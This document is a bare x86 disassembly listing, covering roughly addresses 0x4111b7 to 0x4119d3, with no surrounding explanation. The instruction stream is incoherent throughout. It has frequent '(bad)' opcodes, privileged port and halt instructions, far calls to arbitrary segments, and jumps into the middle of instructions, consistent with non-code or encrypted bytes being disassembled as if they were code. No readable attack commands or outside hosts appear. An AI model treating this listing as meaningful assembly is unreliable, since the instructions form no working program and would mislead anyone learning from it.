  4111b7:	test   BYTE PTR [edx-0x10122a51],dl
  4111bd:	ds imul DWORD PTR cs:[eax-0x3cc57ac0]
  4111c5:	scas   eax,DWORD PTR es:[edi]
  4111c6:	pop    esp
  4111c7:	cld    
  4111c8:	xchg   eax,edx
  4111ca:	loop   0x41116a
  4111cc:	sub    eax,DWORD PTR [eax]
  4111ce:	xchg   BYTE PTR [edx-0x6e],dh
  4111d1:	sbb    eax,0xbbbdc071
  4111d6:	and    al,dh
  4111d8:	and    BYTE PTR [esi+edi*1],ch
  4111db:	push   ebx
  4111dc:	sbb    bh,ah
  4111de:	sbb    eax,0xb145325a
  4111e3:	cli    
  4111e4:	adc    dh,al
  4111e6:	add    DWORD PTR fs:[ecx+0x7d],esi
  4111ea:	shl    BYTE PTR [edx+0x49],cl
  4111ed:	fst    DWORD PTR [eax-0x47]
  4111f0:	or     BYTE PTR [ecx+0x4e],0xcc
  4111f4:	js     0x4111ea
  4111f6:	ja     0x4111c0
  4111f8:	pop    edx
  4111f9:	out    0x7d,al
  4111fb:	mov    edx,0x787f1489
  411200:	add    ah,BYTE PTR [ecx]
  411202:	ins    BYTE PTR es:[edi],dx
  411203:	cmp    ch,bh
  411205:	or     ax,0xfa22
  411209:	(bad)  [edx+ebx*8+0x1c1b39cb]
  411210:	push   ebp
  411211:	ficomp DWORD PTR [eax]
  411213:	dec    ebx
  411214:	and    ebx,esp
  411216:	es jb  0x411257
  411219:	jmp    0x41123a
  41121b:	enter  0xa2f3,0xe8
  41121f:	ja     0x41129d
  411221:	adc    al,0x35
  411223:	adc    BYTE PTR [esp+eax*8+0x45],dl
  411227:	push   ebp
  411228:	mov    cs,WORD PTR [edx+0x62fdcaee]
  41122e:	in     al,dx
  41122f:	sub    BYTE PTR [ebp-0x3e7e2eb2],ch
  411235:	outs   dx,BYTE PTR ds:[esi]
  411236:	xor    bl,BYTE PTR [eax+0x5c996c47]
  41123c:	and    ch,al
  41123e:	mov    eax,DWORD PTR [si]
  411241:	mov    cl,0x3d
  411243:	pop    es
  411244:	push   0xa9bfe3b8
  411249:	ror    DWORD PTR [ebp+0x1c],0x56
  41124d:	push   ecx
  41124e:	je     0x411292
  411250:	sub    BYTE PTR [ecx+0x25],bl
  411253:	or     dh,bh
  411255:	jge    0x411279
  411257:	in     al,dx
  411258:	pop    ds
  411259:	pop    eax
  41125a:	adc    ebx,DWORD PTR [eax+0x39214d46]
  411260:	pop    ebx
  411261:	lds    edi,FWORD PTR [edi]
  411263:	and    DWORD PTR [ebx],edx
  411265:	add    bh,BYTE PTR [esp+edi*8]
  411268:	lock aas 
  41126a:	pop    esp
  41126b:	jge    0x411203
  41126d:	pop    esp
  41126e:	lods   eax,DWORD PTR ds:[esi]
  41126f:	dec    esp
  411270:	mov    edx,0x19aadcfb
  411275:	cmp    BYTE PTR ds:0x2b15f7c7,0x1b
  41127c:	jno    0x411297
  41127e:	and    dl,ch
  411280:	(bad)  
  411281:	sbb    al,0xba
  411283:	mov    ebx,0xb5c33d5f
  411288:	mov    bh,0x2a
  41128a:	add    esi,ecx
  41128c:	daa    
  41128d:	ret    
  41128e:	adc    al,0x8f
  411290:	mov    cl,0xa8
  411292:	sbb    al,0xac
  411294:	out    dx,eax
  411295:	std    
  411296:	daa    
  411297:	add    DWORD PTR [ecx],ebp
  411299:	mov    cl,0xdd
  41129b:	jmp    0xe6ef:0xee76a99a
  4112a2:	jns    0x4112dc
  4112a4:	fist   DWORD PTR [edx]
  4112a6:	gs mov esp,0x755451e
  4112ac:	inc    edi
  4112ad:	dec    ebx
  4112ae:	dec    ecx
  4112af:	mov    DWORD PTR [edi+eax*1-0x4d],ebp
  4112b3:	maxps  xmm6,XMMWORD PTR [eax+0x2d8985e4]
  4112ba:	fsubp  st(5),st
  4112bc:	pushf  
  4112bd:	and    ch,BYTE PTR [edi+0x59]
  4112c0:	into   
  4112c1:	in     al,0x1b
  4112c3:	push   ds
  4112c4:	retf   0x7411
  4112c7:	addr16 lahf 
  4112c9:	xlat   BYTE PTR ds:[ebx]
  4112ca:	fsub   DWORD PTR [ebx+eiz*1-0x6b46cdc1]
  4112d1:	lods   al,BYTE PTR ds:[esi]
  4112d2:	fsubr  st(0),st
  4112d4:	or     BYTE PTR [edx-0x60],al
  4112d7:	adc    DWORD PTR cs:0xe1029018,esi
  4112de:	mov    eax,ds:0xf4361954
  4112e3:	cmp    eax,0xfda6e883
  4112e8:	push   edi
  4112e9:	jae    0x411280
  4112eb:	and    al,0xd5
  4112ed:	outs   dx,BYTE PTR ds:[esi]
  4112ee:	xchg   esi,eax
  4112ef:	mov    ebx,0xb6795e7a
  4112f4:	inc    eax
  4112f5:	enter  0x94c3,0x5f
  4112f9:	fist   WORD PTR [ebx]
  4112fb:	xchg   esi,esp
  4112fd:	retf   
  4112fe:	cmp    dh,BYTE PTR [ebx]
  411300:	push   0xffffffcd
  411302:	retf   
  411303:	test   al,0x24
  411305:	mov    bh,0xd9
  411307:	add    DWORD PTR [esi+0x24b96b13],edx
  41130d:	shr    DWORD PTR [eax-0x56],1
  411310:	sbb    eax,0x4b11c5df
  411315:	adc    edx,DWORD PTR [edi]
  411317:	pop    edi
  411318:	or     bh,bh
  41131a:	inc    esi
  41131b:	cwde   
  41131c:	or     DWORD PTR [edx-0x10],ecx
  41131f:	enter  0xffb2,0x65
  411323:	add    DWORD PTR [ebx+eiz*8-0x1d],eax
  411327:	lods   eax,DWORD PTR ds:[esi]
  411328:	mov    bl,0x84
  41132a:	dec    ebp
  41132b:	cmc    
  41132c:	dec    ebp
  41132d:	int3   
  41132e:	retf   0x1b00
  411331:	mov    al,ds:0x9b831d38
  411336:	jae    0x411375
  411338:	daa    
  411339:	jmp    0x771abc59
  41133e:	mov    ds:0xb134bc83,al
  411343:	mov    WORD PTR [esi+0x2b],?
  411346:	call   0x8eab:0x33720ad1
  41134d:	mov    ebp,0xa96b8ea
  411352:	xor    eax,0xf385b6af
  411357:	or     eax,0x7886bc9e
  41135c:	loopne 0x41137f
  41135e:	pop    ebp
  41135f:	pop    edx
  411360:	mov    ebp,0x62e6029
  411365:	adc    edx,DWORD PTR [eax]
  411367:	and    dl,BYTE PTR [edi+0x364b33f3]
  41136d:	xchg   ecx,eax
  41136e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41136f:	test   eax,0x742919b6
  411374:	mov    bh,0xd7
  411376:	hlt    
  411377:	jbe    0x4113e3
  411379:	mov    DWORD PTR [esi+0x1f],esp
  41137c:	int    0x1
  41137e:	xor    ah,al
  411380:	or     esp,DWORD PTR [edi+0x20]
  411383:	and    esi,edi
  411385:	cmp    al,0x2e
  411387:	adc    al,0xbe
  411389:	sar    ebp,0x8c
  41138c:	leave  
  41138d:	add    al,0x9f
  41138f:	mov    WORD PTR [ebx],es
  411391:	call   0xb4ac066
  411396:	mov    ah,0x6a
  411398:	div    BYTE PTR [edi]
  41139a:	mov    esi,0xe44a9fac
  41139f:	cwde   
  4113a0:	mov    bh,0xbd
  4113a2:	jo     0x411398
  4113a4:	sub    al,0xf0
  4113a6:	(bad)  
  4113a7:	cmp    al,ah
  4113a9:	and    ebp,DWORD PTR fs:[edx+0x18fcea83]
  4113b0:	retf   0xab5e
  4113b3:	jp     0x41137b
  4113b5:	jl     0x4113a3
  4113b7:	scas   eax,DWORD PTR es:[edi]
  4113b8:	aad    0xd1
  4113ba:	call   DWORD PTR [edi+0x14]
  4113bd:	cmp    bl,BYTE PTR [eax]
  4113bf:	xchg   edx,eax
  4113c0:	mul    DWORD PTR [ebx+0x14739413]
  4113c6:	mov    eax,ds:0xc10693ce
  4113cb:	ret    0x51e2
  4113ce:	pop    esp
  4113cf:	sti    
  4113d0:	cmp    al,0x29
  4113d2:	ja     0x4113f1
  4113d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113d5:	hlt    
  4113d6:	(bad)  
  4113d7:	cld    
  4113d8:	enter  0xd0a2,0x72
  4113dc:	ret    0x5818
  4113df:	push   0xffffffa3
  4113e1:	test   eax,0x80a226e3
  4113e6:	call   0x1a0c:0x3d2f3fc7
  4113ed:	push   0x55
  4113ef:	sub    eax,0xc1c1fd12
  4113f4:	inc    edi
  4113f5:	push   ss
  4113f6:	in     al,0xb0
  4113f8:	xchg   edi,eax
  4113f9:	add    DWORD PTR [esi+0x4932bd1d],ebp
  4113ff:	mov    eax,ds:0xff11bb5c
  411404:	mov    BYTE PTR [esi+0x29760075],bl
  41140a:	push   0x8086b9ec
  41140f:	sbb    al,0x57
  411411:	fxch   st(7)
  411413:	(bad)  
  411414:	pop    esp
  411415:	push   ebp
  411416:	(bad)  
  411417:	fadd   QWORD PTR [edi]
  411419:	cli    
  41141a:	mov    al,0xba
  41141c:	inc    esi
  41141d:	ds jmp 0xaec1:0x5a7021fe
  411425:	lock adc eax,0xa61f21ed
  41142b:	pushf  
  41142c:	cmp    al,0x5e
  41142e:	out    dx,eax
  41142f:	push   ebx
  411430:	iret   
  411431:	loopne 0x411442
  411433:	mov    ch,0xa2
  411435:	fst    QWORD PTR [eax-0x7e73bc1]
  41143b:	(bad)  
  41143c:	mov    al,0xa
  41143e:	mov    esi,0xeb17c907
  411443:	xor    al,BYTE PTR [ecx+0x10]
  411446:	dec    eax
  411447:	sub    edi,DWORD PTR [eax+0x7d]
  41144a:	pop    eax
  41144b:	test   BYTE PTR [ecx-0x291d7848],dl
  411451:	pop    esp
  411452:	js     0x41148d
  411454:	ins    BYTE PTR es:[edi],dx
  411455:	xchg   DWORD PTR [edx],ebx
  411457:	inc    ebp
  411458:	push   eax
  411459:	aad    0x2c
  41145b:	adc    BYTE PTR [eax+0x726ee3f6],0x70
  411462:	or     edx,eax
  411464:	jo     0x41141f
  411466:	test   DWORD PTR [ebp+0x42],esi
  411469:	jge    0x411477
  41146b:	dec    ecx
  41146c:	stos   BYTE PTR es:[edi],al
  41146d:	xchg   esp,eax
  41146e:	mov    ebp,0x7f6f77d5
  411473:	or     al,0x89
  411475:	retf   
  411476:	pop    edx
  411477:	cmp    al,0xf
  411479:	mov    edx,0x2f1e2b23
  41147e:	push   cs
  41147f:	aaa    
  411480:	sbb    eax,0x92907e8a
  411485:	jo     0x411471
  411487:	cmp    BYTE PTR [ecx-0x244e17b1],0xb4
  41148e:	int    0x38
  411490:	jb     0x4114df
  411492:	push   ebx
  411493:	cmp    BYTE PTR [eax],al
  411495:	jbe    0x4114d4
  411497:	rcr    edx,cl
  411499:	dec    esi
  41149a:	adc    esp,DWORD PTR [ebx-0x4fff9a6b]
  4114a0:	fdivr  QWORD PTR [edx-0x49]
  4114a3:	retf   0xd046
  4114a6:	dec    ecx
  4114a7:	push   ecx
  4114a8:	jns    0x411502
  4114aa:	mov    BYTE PTR [ebx],al
  4114ac:	mov    cl,0x3b
  4114ae:	cdq    
  4114af:	mov    es,WORD PTR [eax-0x23c73ee0]
  4114b5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4114b7:	xchg   edx,eax
  4114b8:	or     ah,al
  4114ba:	xchg   ecx,eax
  4114bb:	push   ebx
  4114bc:	aam    0x9e
  4114be:	mov    ch,0x86
  4114c0:	inc    edi
  4114c1:	mov    al,0xdb
  4114c3:	mov    edx,0x7b8ce877
  4114c8:	push   eax
  4114c9:	adc    DWORD PTR [edx+0x56a9ae90],ebp
  4114cf:	fidivr DWORD PTR [esi-0x6853e402]
  4114d5:	dec    ecx
  4114d6:	scas   eax,DWORD PTR es:[edi]
  4114d7:	cld    
  4114d8:	ror    BYTE PTR [ebx+eiz*2],0xb
  4114dc:	lock shl al,1
  4114df:	int    0xd5
  4114e1:	jge    0x411535
  4114e3:	fprem1 
  4114e5:	xor    eax,ecx
  4114e7:	int    0x8a
  4114e9:	or     DWORD PTR [ecx],esi
  4114eb:	mov    ds:0xc1533ba2,al
  4114f0:	jl     0x41153f
  4114f2:	pop    edi
  4114f3:	jno    0x4114a0
  4114f5:	xor    ch,BYTE PTR [eax]
  4114f7:	leave  
  4114f8:	test   esi,esi
  4114fa:	cmc    
  4114fb:	sub    eax,0x7f85184a
  411500:	cwde   
  411501:	and    al,0x32
  411503:	cmp    al,0x8b
  411505:	loope  0x41151f
  411507:	int3   
  411508:	mov    al,0xe3
  41150a:	mov    ecx,gs
  41150c:	add    eax,0x5d898751
  411511:	sub    DWORD PTR [edi-0x2b],edi
  411514:	or     al,0x46
  411516:	jp     0x41150f
  411518:	(bad)  
  411519:	enter  0x9358,0x7c
  41151d:	or     al,0xc3
  41151f:	mov    ds:0xfeb751d1,al
  411524:	push   0x8b4a341a
  411529:	cmp    eax,0xd105e7e2
  41152e:	lods   eax,DWORD PTR ds:[esi]
  41152f:	int3   
  411530:	nop
  411531:	pop    edi
  411532:	mov    ah,0x74
  411534:	bound  ebx,QWORD PTR [edx+esi*1+0x29678f52]
  41153b:	mov    ecx,0x8969bf4f
  411540:	jns    0x4114d7
  411542:	inc    eax
  411543:	loop   0x4114ec
  411545:	sbb    al,0x77
  411547:	and    BYTE PTR [ebx-0x475228f1],cl
  41154d:	(bad)  
  41154e:	mov    esp,0xc9d6e29b
  411553:	aam    0x13
  411555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411556:	inc    esp
  411557:	inc    edx
  411558:	in     eax,0xe0
  41155a:	add    ecx,edi
  41155c:	retf   0x1d0c
  41155f:	push   0xffffffb9
  411561:	mov    bl,0x7c
  411563:	pop    ds
  411564:	out    dx,eax
  411565:	push   0xffffffb7
  411567:	sbb    al,0x7d
  411569:	icebp  
  41156a:	mov    cl,0xa7
  41156c:	and    ebx,DWORD PTR [ecx-0x40]
  41156f:	gs inc esi
  411571:	test   al,0xd7
  411573:	jae    0x4115c9
  411575:	minps  xmm4,XMMWORD PTR [edx+0x7203f4ec]
  41157c:	adc    al,0xd0
  41157e:	std    
  41157f:	pop    ebp
  411580:	cs (bad) 
  411583:	mov    edx,0x5c76044c
  411588:	mov    dh,0xbf
  41158a:	int    0x32
  41158c:	cmovae edi,DWORD PTR fs:[ecx+0x12]
  411591:	add    eax,0x742f3763
  411596:	sub    BYTE PTR [eax-0x3d7c1088],dl
  41159c:	xchg   edx,eax
  41159d:	and    ah,BYTE PTR ds:[edx]
  4115a0:	shl    DWORD PTR [edx+0x4e],cl
  4115a3:	mov    ds:0x69622eea,al
  4115a8:	jg     0x4115ba
  4115aa:	jmp    DWORD PTR [edx]
  4115ac:	into   
  4115ad:	(bad)  
  4115ae:	add    ch,BYTE PTR [eax+0x3ed038bf]
  4115b4:	pop    esp
  4115b5:	push   edi
  4115b6:	push   es
  4115b7:	inc    ebx
  4115b8:	dec    ecx
  4115b9:	leave  
  4115ba:	jbe    0x411589
  4115bc:	(bad)  
  4115be:	int    0xd4
  4115c0:	arpl   bp,si
  4115c2:	sti    
  4115c3:	dec    esi
  4115c4:	xchg   ebp,eax
  4115c5:	mov    ecx,0x10adae21
  4115ca:	je     0x411553
  4115cc:	xchg   esp,eax
  4115cd:	sar    DWORD PTR [ecx],0x69
  4115d0:	test   eax,0x5a6b34f1
  4115d5:	xlat   BYTE PTR ds:[ebx]
  4115d6:	arpl   WORD PTR [edi+0xd4f95e7],bx
  4115dc:	xor    ch,BYTE PTR [edx]
  4115de:	sbb    al,0xe1
  4115e0:	stc    
  4115e1:	aam    0x78
  4115e3:	mov    cl,0x98
  4115e5:	rcl    DWORD PTR [edi+0xf],1
  4115e8:	arpl   cx,dx
  4115ea:	or     eax,0x7bdbc3f1
  4115ef:	ja     0x41161e
  4115f1:	mov    edx,DWORD PTR ds:0xad5045de
  4115f7:	imul   edi,ebx,0x1e2453c6
  4115fd:	adc    ah,al
  4115ff:	call   0x2c47:0x9bff1cd5
  411606:	repz or DWORD PTR [ebx+0x33],0x15dc97cb
  41160e:	mov    ah,0xa5
  411610:	adc    BYTE PTR [edx+0x0],0x9
  411614:	lods   al,BYTE PTR ds:[esi]
  411615:	mov    esp,0x90238528
  41161a:	xor    BYTE PTR [esp+ecx*4-0x33],bl
  41161e:	gs pop eax
  411620:	(bad)  
  411621:	xchg   esp,eax
  411622:	repnz xchg ebp,eax
  411624:	mov    cl,0x46
  411626:	repz gs pop edx
  411629:	aas    
  41162a:	jl     0x4116a3
  41162c:	aas    
  41162d:	inc    esi
  41162e:	fwait
  41162f:	jnp    0x41165d
  411631:	jge    0x4115f2
  411633:	xchg   edi,eax
  411634:	push   edi
  411635:	or     al,0x23
  411637:	stos   DWORD PTR es:[edi],eax
  411638:	and    dh,BYTE PTR [ebp+0x17]
  41163b:	or     BYTE PTR [ecx-0x2b],0x84
  41163f:	mov    ebp,0x27bc43e4
  411644:	lock jmp 0x4115cb
  411647:	pop    ds
  411648:	jge    0x41169b
  41164a:	lea    edx,ds:0xfd1b63d4
  411650:	aaa    
  411651:	or     esp,ebp
  411653:	fsub   QWORD PTR [ebx+0x6d]
  411656:	or     eax,0x7a1c910c
  41165b:	cmc    
  41165c:	and    al,BYTE PTR [edx+0x17]
  41165f:	mov    ch,0x13
  411661:	push   ss
  411662:	xchg   edi,eax
  411663:	loopne 0x4116db
  411665:	or     al,0x1f
  411667:	sub    ecx,DWORD PTR [edx]
  411669:	out    dx,al
  41166a:	pop    eax
  41166b:	leave  
  41166c:	pop    ebx
  41166d:	shl    DWORD PTR [ebp+0xd6adaf0],1
  411673:	imul   eax,ebp,0x66bd1637
  411679:	mov    esp,0x32ea7d25
  41167e:	in     eax,0x24
  411680:	xchg   esi,eax
  411681:	arpl   WORD PTR ds:0x33c0ab96,sp
  411687:	test   eax,0x1257165a
  41168c:	xor    DWORD PTR [eax-0x34becb61],ebx
  411692:	outs   dx,BYTE PTR ds:[esi]
  411693:	call   0x615:0x1d289c81
  41169a:	and    esi,ecx
  41169c:	bndldx bnd0,[esi-0x19dfd9c8]
  4116a3:	push   0x37b4877a
  4116a8:	cmp    eax,0xcf31a4b6
  4116ad:	cmp    BYTE PTR [eax+eax*1+0x4e],dl
  4116b1:	jo     0x41167e
  4116b3:	stos   DWORD PTR es:[edi],eax
  4116b4:	pop    edi
  4116b5:	and    DWORD PTR [eax],edi
  4116b7:	ds xchg ebp,eax
  4116b9:	neg    ebp
  4116bb:	dec    ebx
  4116bc:	xchg   esp,eax
  4116bd:	jb     0x4116a9
  4116bf:	not    edi
  4116c1:	shl    dh,cl
  4116c3:	pusha  
  4116c4:	pop    esi
  4116c5:	aad    0x38
  4116c7:	mov    bl,0x44
  4116c9:	jge    0x411679
  4116cb:	leave  
  4116cc:	push   edi
  4116cd:	push   ds
  4116ce:	shr    BYTE PTR [eax],0x65
  4116d1:	rcr    BYTE PTR [ebx+0xb],1
  4116d4:	mov    ds:0x9303c5eb,eax
  4116d9:	hlt    
  4116da:	fisub  DWORD PTR [ecx-0x179c8387]
  4116e0:	addr16 retf 0xa7dc
  4116e4:	cmp    eax,0x7fad997c
  4116e9:	inc    esi
  4116ea:	(bad)  
  4116eb:	lahf   
  4116ec:	jb     0x41168c
  4116ee:	and    ebp,ebx
  4116f0:	cld    
  4116f1:	jb     0x4116c0
  4116f3:	push   es
  4116f4:	popa   
  4116f5:	or     al,0x78
  4116f7:	jmp    0x411745
  4116f9:	sbb    al,0x3b
  4116fb:	cmp    eax,0x8a38b1e8
  411700:	in     eax,dx
  411701:	fld    QWORD PTR [ebp*1-0x32299ce4]
  411708:	mov    edi,0xc46f96e5
  41170d:	sub    BYTE PTR [eax+0x76],0xd3
  411711:	(bad)  
  411712:	leave  
  411713:	mov    WORD PTR [eax],ds
  411715:	lock push ecx
  411717:	mov    esp,0x20e24477
  41171c:	and    ecx,DWORD PTR [esp+ebp*8+0x32be14db]
  411723:	arpl   WORD PTR [edx-0x7c],dx
  411726:	or     BYTE PTR [ebx+0x44f4d983],dl
  41172c:	clc    
  41172d:	jmp    0x4116bd
  41172f:	mov    bh,0x81
  411731:	std    
  411732:	loop   0x411712
  411734:	in     al,0xff
  411736:	imul   DWORD PTR [esi+0x6d3f5db3]
  41173c:	xor    BYTE PTR [eax-0x4e],bl
  41173f:	fwait
  411740:	dec    eax
  411741:	push   edi
  411742:	dec    edi
  411743:	push   es
  411744:	ss repz inc esi
  411747:	and    BYTE PTR [ebx+0x4b14b06],al
  41174d:	fmul   QWORD PTR [ecx-0x31970111]
  411753:	fcom   QWORD PTR [edi-0x30e72993]
  411759:	xchg   ebp,eax
  41175a:	mov    WORD PTR [ebx],cs
  41175c:	nop
  41175d:	mov    dl,BYTE PTR [edi+0x7a]
  411760:	out    dx,al
  411761:	fst    QWORD PTR es:[edx-0x79]
  411765:	gs out 0x31,eax
  411768:	add    eax,0xeab9f0a4
  41176d:	fwait
  41176e:	sub    BYTE PTR [eax],cl
  411770:	pop    ds
  411771:	je     0x411789
  411773:	stos   DWORD PTR es:[edi],eax
  411774:	inc    edi
  411775:	add    ebp,0x17b61ffd
  41177b:	mov    esi,0x82cd9c8c
  411780:	fmul   QWORD PTR [ecx]
  411782:	xchg   edi,eax
  411783:	scas   eax,DWORD PTR es:[edi]
  411784:	push   edi
  411785:	gs leave 
  411787:	jae    0x4117ef
  411789:	mov    dl,0x86
  41178b:	add    BYTE PTR [ecx],ch
  41178d:	scas   al,BYTE PTR es:[edi]
  41178e:	mov    BYTE PTR [esi],al
  411790:	lods   eax,DWORD PTR ds:[esi]
  411791:	push   esi
  411792:	pop    ebp
  411793:	in     eax,dx
  411794:	push   ebx
  411795:	mov    al,0x2
  411797:	(bad)  
  411798:	xor    al,0x26
  41179a:	dec    edx
  41179b:	jo     0x411780
  41179d:	int    0xae
  41179f:	inc    edi
  4117a0:	and    edx,DWORD PTR [edx-0x33]
  4117a3:	mov    eax,0x74d79003
  4117a8:	lea    ebp,[ecx+0x71c01241]
  4117ae:	dec    esp
  4117af:	leave  
  4117b0:	ja     0x4117ab
  4117b2:	daa    
  4117b3:	in     eax,0x4
  4117b5:	es es cmp al,0xc5
  4117b9:	addr16 push ebp
  4117bb:	fnstenv [esi-0x6ebf86a4]
  4117c1:	cdq    
  4117c2:	rcl    BYTE PTR [eax],cl
  4117c4:	dec    esi
  4117c5:	push   ss
  4117c6:	dec    esp
  4117c7:	xchg   ebp,eax
  4117c8:	mov    al,ds:0xef68926f
  4117cd:	add    bh,BYTE PTR [ecx-0x57a47850]
  4117d3:	xchg   ebx,eax
  4117d4:	rcl    BYTE PTR [ebp-0x6f],cl
  4117d7:	in     eax,0x7
  4117d9:	xchg   edi,eax
  4117da:	cli    
  4117db:	add    BYTE PTR [edx-0x44f401d4],ch
  4117e1:	mov    di,0x2f09
  4117e5:	push   edi
  4117e6:	cmc    
  4117e7:	push   edx
  4117e8:	or     bh,BYTE PTR [ecx-0x3c]
  4117eb:	std    
  4117ec:	inc    edi
  4117ed:	pop    ds
  4117ee:	aaa    
  4117ef:	into   
  4117f0:	div    DWORD PTR [ecx+0xb4228b]
  4117f6:	call   0x3936:0xb75ecafd
  4117fd:	jg     0x411840
  4117ff:	sar    BYTE PTR [edx+0x3c161b22],0x39
  411806:	mov    eax,0x713b4323
  41180b:	fild   WORD PTR [ecx+esi*2-0x9ee6add]
  411812:	sub    edi,0xbe64f037
  411818:	jo     0x411873
  41181a:	and    dl,BYTE PTR [edx]
  41181c:	inc    edi
  41181d:	sahf   
  41181e:	ret    
  41181f:	loopne 0x411882
  411821:	and    ebx,edi
  411823:	mov    ecx,0xa236b642
  411828:	call   0xa79c5a17
  41182d:	xchg   esp,eax
  41182e:	adc    bl,BYTE PTR [esi+0xa]
  411831:	daa    
  411832:	adc    edx,eax
  411834:	mov    al,ds:0xdc4adfec
  411839:	sar    DWORD PTR [ebp-0x5c],0x1e
  41183d:	div    BYTE PTR [edi-0x17]
  411840:	mov    ebx,0x4f00797b
  411845:	inc    ebp
  411846:	mov    al,ss:0x696a74ac
  41184c:	es inc ecx
  41184e:	(bad)  
  41184f:	je     0xb23b2ee1
  411855:	dec    eax
  411856:	jo     0x411882
  411858:	and    BYTE PTR [ebx+0x13],ch
  41185b:	pop    esp
  41185c:	inc    DWORD PTR [ebx]
  41185e:	sbb    eax,0x9546848d
  411863:	loop   0x41188f
  411865:	popf   
  411866:	test   DWORD PTR [ecx+0x12],ebx
  411869:	adc    ebp,DWORD PTR [ebx]
  41186b:	adc    dl,BYTE PTR [eax-0x48b8f571]
  411871:	bound  eax,QWORD PTR [esp+edx*2+0x23]
  411875:	shl    DWORD PTR [ecx+0x73ce2edb],0x22
  41187c:	std    
  41187d:	dec    esi
  41187e:	outs   dx,DWORD PTR ds:[esi]
  41187f:	int3   
  411880:	dec    ebx
  411881:	ss or  eax,edx
  411884:	fs dec esi
  411886:	xor    bl,BYTE PTR [ebx+eax*4]
  411889:	mov    ebp,edx
  41188b:	int3   
  41188c:	call   0x5038:0x60a061c8
  411893:	popa   
  411894:	cmp    cl,al
  411896:	sub    al,0xdb
  411898:	xor    DWORD PTR [eax+ebp*4-0x1b],ecx
  41189c:	jmp    0x4118b7
  41189e:	out    0x57,al
  4118a0:	xchg   ebx,eax
  4118a1:	retf   0x43e0
  4118a4:	push   0x4c
  4118a6:	push   esp
  4118a7:	sbb    eax,0xb639df4b
  4118ac:	jbe    0x41186e
  4118ae:	mov    WORD PTR [ecx],?
  4118b0:	(bad)  
  4118b1:	and    al,BYTE PTR [edi+ebp*8-0x6a]
  4118b5:	loopne 0x4118ed
  4118b7:	xor    BYTE PTR ds:0x41de623c,0x75
  4118be:	and    dh,BYTE PTR [edi-0x17df6a55]
  4118c4:	repz cmp eax,0xfad4ada6
  4118ca:	cwde   
  4118cb:	pop    edi
  4118cc:	inc    ecx
  4118cd:	fldcw  WORD PTR [ecx-0x32c380f7]
  4118d3:	fisub  WORD PTR [esi+0x31]
  4118d6:	(bad)  
  4118d7:	idiv   BYTE PTR [edx]
  4118d9:	pop    ss
  4118da:	cmp    BYTE PTR [eax+0x1cfc50e3],dh
  4118e0:	loop   0x411910
  4118e2:	pop    esp
  4118e3:	mov    esi,0xc9b7cf1c
  4118e8:	jmp    0x4118a0
  4118ea:	cli    
  4118eb:	in     al,dx
  4118ec:	ins    DWORD PTR es:[edi],dx
  4118ed:	ss jns 0x41188c
  4118f0:	enter  0x8c27,0x54
  4118f4:	in     al,dx
  4118f5:	(bad)  
  4118f6:	jg     0x41191e
  4118f8:	pop    edx
  4118f9:	jno    0x4118b4
  4118fb:	stos   DWORD PTR es:[edi],eax
  4118fc:	mov    dl,0xda
  4118fe:	arpl   di,bx
  411900:	lahf   
  411901:	jle    0x411966
  411903:	jle    0x4118cd
  411905:	dec    ecx
  411906:	cld    
  411907:	adc    al,0xca
  411909:	mov    DWORD PTR ds:0xcb39031,ebx
  41190f:	fmulp  st(3),st
  411911:	and    esi,edx
  411913:	aaa    
  411914:	inc    esp
  411915:	adc    al,cl
  411917:	cs sub eax,0x131321ca
  41191d:	cmp    al,0xb7
  41191f:	in     eax,0x79
  411921:	(bad)  
  411922:	push   ecx
  411923:	bound  edx,QWORD PTR [edi]
  411925:	sub    BYTE PTR [edx-0xf],bl
  411928:	inc    ecx
  411929:	out    0xf6,al
  41192b:	out    0x60,eax
  41192d:	out    0x60,al
  41192f:	xor    BYTE PTR [esi+ebp*4-0x5105e4dd],0x9d
  411937:	outs   dx,BYTE PTR ds:[esi]
  411938:	jg     0x4119b6
  41193a:	jl     0x411990
  41193c:	ds inc eax
  41193e:	dec    esi
  41193f:	mov    ds:0x93d63618,al
  411944:	loope  0x411982
  411946:	cmp    ah,al
  411948:	sub    al,0xfe
  41194a:	mov    bh,0x8c
  41194c:	into   
  41194d:	xchg   esi,eax
  41194e:	arpl   WORD PTR [eax+eiz*2],bp
  411951:	adc    al,0xff
  411953:	sti    
  411954:	lds    edi,FWORD PTR [ecx]
  411956:	pop    ebp
  411957:	cli    
  411958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411959:	jbe    0x4118e1
  41195b:	jl     0x4119c2
  41195d:	sub    BYTE PTR [eax-0x4090b3fe],ch
  411963:	shr    dh,1
  411965:	add    al,0x70
  411967:	into   
  411968:	dec    esp
  411969:	cmp    BYTE PTR [esi-0x5e55ac60],al
  41196f:	pop    es
  411970:	mov    dh,0xa0
  411972:	add    BYTE PTR [esi+0x6b00a2bd],cl
  411978:	cs sub eax,0x340ad56c
  41197e:	ret    
  41197f:	lahf   
  411980:	bound  esp,QWORD PTR [eax-0x2b]
  411983:	stc    
  411984:	cmp    al,0x33
  411986:	jle    0x411991
  411988:	or     dl,BYTE PTR [ebx-0x75]
  41198b:	cmp    edi,edi
  41198d:	in     al,dx
  41198e:	jo     0x4119e9
  411990:	mov    DWORD PTR [ebp-0x4de6012c],esi
  411996:	dec    edi
  411997:	cmp    esi,DWORD PTR [ebp-0x4]
  41199a:	jne    0x411a06
  41199c:	mov    edx,0x790449ad
  4119a1:	retf   
  4119a2:	pop    ebp
  4119a3:	cs xchg ebx,eax
  4119a5:	jns    0x41193d
  4119a7:	es std 
  4119a9:	pop    ebx
  4119aa:	(bad)  
  4119ac:	push   edi
  4119ad:	or     eax,0x47c11ce0
  4119b2:	mov    bh,0x88
  4119b4:	jns    0x41197a
  4119b6:	inc    edi
  4119b7:	and    bh,ch
  4119b9:	into   
  4119ba:	out    dx,eax
  4119bb:	fdivr  QWORD PTR [edi+0x7b]
  4119be:	mov    WORD PTR [edi],gs
  4119c0:	push   ebp
  4119c1:	inc    ebx
  4119c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119c3:	add    BYTE PTR [ebx+ebp*4+0x6b],cl
  4119c7:	ss or  al,0x4c
  4119ca:	adc    al,0x32
  4119cc:	aaa    
  4119cd:	imul   ebp,DWORD PTR [edi],0xd528357
  4119d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
